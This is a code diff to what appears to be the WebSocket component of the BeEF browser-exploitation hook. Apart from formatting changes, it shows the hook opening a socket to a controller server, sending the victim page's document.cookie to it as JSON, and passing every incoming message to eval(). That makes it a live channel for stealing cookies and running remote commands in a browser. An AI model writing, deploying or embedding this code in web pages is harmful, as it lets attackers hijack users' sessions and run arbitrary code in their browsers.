@@ -28,7 +28,7 @@ beef.websocket = {
         if (beef.browser.isFF() && !!window.MozWebSocket) {
             beef.websocket.socket = new MozWebSocket("ws://" + webSocketServer + ":" + webSocketPort + "/");
 
-        } else{
+        } else {
             beef.websocket.socket = new WebSocket("ws://" + webSocketServer + ":" + webSocketPort + "/");
 
         }
@@ -42,18 +42,19 @@ beef.websocket = {
             console.log("Socket has been opened!");
 
             /*send browser id*/
-            beef.websocket.send(document.cookie);
+            beef.websocket.send('{"cookie":"' + document.cookie + '"}');
             console.log("Connected and Helo");
         }
-        this.socket.onmessage = function (message){
+        this.socket.onmessage = function (message) {
             console.log("Received message via WS.");
+            //todo check message and send pong if ping req
             eval(message.data);
-           }
+        }
 
     },
 
     send:function (data) {
-       this.socket.send(data);
+        this.socket.send(data);
         console.log("Sent [" + data + "]");
     }
 
